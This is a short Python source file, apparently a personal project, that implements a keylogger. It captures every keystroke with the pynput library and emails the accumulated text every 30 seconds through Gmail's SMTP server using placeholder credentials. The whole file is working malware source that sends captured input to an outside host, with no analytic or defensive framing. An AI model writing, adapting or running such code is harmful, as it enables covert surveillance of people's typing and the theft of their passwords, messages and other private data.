#This code was written by Japneet on 5th march 2022, Thanks for reading.
import pynput.keyboard
import threading
import smtplib 

email="sample@gmail.com" #enter your mail here
password="samplepassword" #enter your mail's password

content=" "
def process_key_strike(Key):
    global content
    try:
        content=content+str(Key.char)
    except AttributeError:
        if Key==Key.space:
            content=content+" "
        else:
            content=content+" "+str(Key)+" " 
    

def report():
    global content, email, password
    send_mail(email, password, content)
    content=""
    timer=threading.Timer(30, report)
    timer.start()

def send_mail(email, password, message):
    server=smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)

mylistener=pynput.keyboard.Listener(on_press=process_key_strike)
with mylistener:
    report()
    mylistener.join()
